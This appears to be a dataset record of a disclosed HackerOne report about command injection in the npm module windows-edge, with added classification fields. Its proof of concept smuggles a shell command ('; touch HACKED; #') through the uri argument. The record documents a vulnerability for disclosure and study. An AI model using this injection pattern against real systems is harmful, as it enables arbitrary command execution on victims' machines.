{
  "reported_to": "Node.js third-party modules",
  "reported_by": "mik317 ",
  "title": "[windows-edge] RCE via insecure command formatting",
  "content": "\nI would like to report a RCE issue in the windows-edge module.\nIt allows to execute arbitrary commands remotely inside the victim's PC\nModule\nmodule name: windows-edge\nversion: 1.0.1\nnpm page: https://www.npmjs.com/package/windows-edge\nModule Description\nLaunch a new Microsoft Edge tab on Windows\nModule Stats\n[102] downloads in the last week\nVulnerability Description\nThe issue occurs because a user input is formatted inside a command that will be executed without any check. The issue arises here: https://github.com/eugeneware/windows-edge/blob/master/index.js#L8\nSteps To Reproduce:\nCreate the following PoC file:\nCode 119 Bytes\n1// poc.js\n2const edge = require('windows-edge');\n3edge({ uri: 'https://github.com/; touch HACKED; #' }, (err, ps) => {})\n4\nCheck there aren't files called HACKED\nExecute the following commands in another terminal:\nCode 71 Bytes\n1npm i windows-edge # Install affected module\n2node poc.js #  Run the PoC\n<image_0>\nPatch\nDon't format commands using insecure user's inputs :)\nSupporting Material/References:\n[OPERATING SYSTEM VERSION]: Kali Linux\n\n\nWrap up\nI contacted the maintainer to let them know: [N]\nI opened an issue in the related repository: [N]\nImpact\nRCE via command formatting on windows-edge\n\n",
  "severity": [
    9.0,
    10.0
  ],
  "bounty": null,
  "weaknesses": [
    "Code Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Zaan8EJv714fXx1zfoYPy6Yg?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-05-20_00-27-21.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-05-20_00-27-21.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVS47X3CA%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T230207Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDxYss4YIGls0cszZQ1SH%2B1xSdoErdhUvyV5RSVsfYSpAIhALgtyBSIuiyvfvrOuahp2dR7dhplGI0zsujwEWu%2Bq6%2BEKrIFCCAQAxoMMDEzNjE5Mjc0ODQ5Igz7reJAfU2xzcJQlysqjwUwgbkDy8FeHuIgjjQZSSQ%2Fwz2JcJJwoIVgnjZMbFWvXxA0hPyrfIjcwtLeyzF3ok5GehIXn91Wy7fDCUkrUU7A5VMhWYEvLV3DxDrYmNMuLZpE%2FWRUJYWQmSgVx2gZtW9%2FqsiGnwRNXYUZa5T6KF%2BUA31gpR%2Bu%2BFMPUkwNvxNyEBRHypojNYRFlzo5EggbbRP8aZmRqD833mDpafMDKiDfNA28eH79vkmbDUKFi%2FRhWykONG8JRQheb75v1GX31hrk1L8u1zPHTFbLn71p2H5wjZmEoonQGf5RhFmpW1zbbUEV65nl5DnLFaOjxUYksFgcGBJco0OtVsqN8nqdspsBJvQy6Qqc4X%2FkzuDXD%2BPYx3S7BO8Xva3s8a8TN96v1gX95XTaTemTmeaj1ESU1Y%2BiCDkvEfkzPaez0cSRWNdsq9i%2B%2B3AB121pQv97UmKNnymRC9XrfNCjheJvP8%2B1ahif4EzzwIZyuwjBMezZKhGLW7ulcNmW88VKqKacmqlyNHYWfiCiGmndOCbeQyYCRid9KzfIQ2SeNeqsnghfx8JVdvGKKtPB1hk7OQNCqb%2BtpgQWm%2B8n%2BtDNRQImuMOGK14DG3yRHy9Avx%2FHOGeF8a9GVJ6NJimW9Ecb2T6E7RqL7ne5qRZDmafIXgH6mlCFVcf%2Flr5QeQ52RhBCPYo6TRRgBWZ%2FEovl46GkFsYVBX%2FIr4SzvdVa%2FNww4T5NYik3vIJ1NHswu7sqCeZdDw7s3nxsVMRVYSGo72HmcEKxy7ZvjHaQ7%2FA%2FhytntT5d9gFqm%2BJZS2feTkdBLll7%2FZmU%2F0J7tml4GCVi0gUlz6n7oXDJBImiDBsaAqob0HPuP1lnTDGOARLWRi1VAkeyiSiZx6MQML3cjL8GOrABJaY4PqkzyFbyL9b2dX4ahmhxVJurQJJj1YCo%2FWMfCIcjtRIVhFMbuG8aMIc9rpd5RnH%2BdThD0TThbFSeDBmVPFdFSLa8sb4P%2FriAdsyJGyDCYOkPOqU5CNy29uE2efF02gCJn%2F3WqBrgnyVPeV9MEustSu%2Bi2xovh9huv2%2ByWnLF8g1vc9Ecjq6wFibTWSxIYTLlafk7orczm6J8TcD3XYRmLnPpvaubR7I6XZoSaZU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=dd2979184e35ad47d763bbbf4f4d8eb25e7cad0b01be56599b3e53d334183d9d"
  },
  "disclosed_date": 1598321040,
  "report_url": "https://hackerone.com/reports/878420",
  "is_multi_component": false,
  "complexity": "LOW",
  "novelty": "LOW",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the vulnerable module: npm i windows-edge"
    ],
    [
      2,
      "Run the PoC script: node poc.js (where poc.js contains the malicious command injection)"
    ]
  ],
  "vuln_description": "The windows-edge module is vulnerable to Remote Code Execution (RCE) due to insecure command formatting. User input is directly incorporated into a system command without proper sanitization, allowing an attacker to execute arbitrary commands on the victim's system.",
  "reason": "The vulnerability is straightforward to discover as it involves a common command injection pattern where user input is directly concatenated into a system command. The attack does not require complex interactions or understanding of multiple components.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves command injection via user-controlled input in the 'windows-edge' module, which is not related to authentication or authorization (AuthN/AuthZ) issues. The proposed methodologies focus on AuthN/AuthZ bypasses and IDOR vulnerabilities, which are not applicable here.",
    "is_detectable": false
  }
}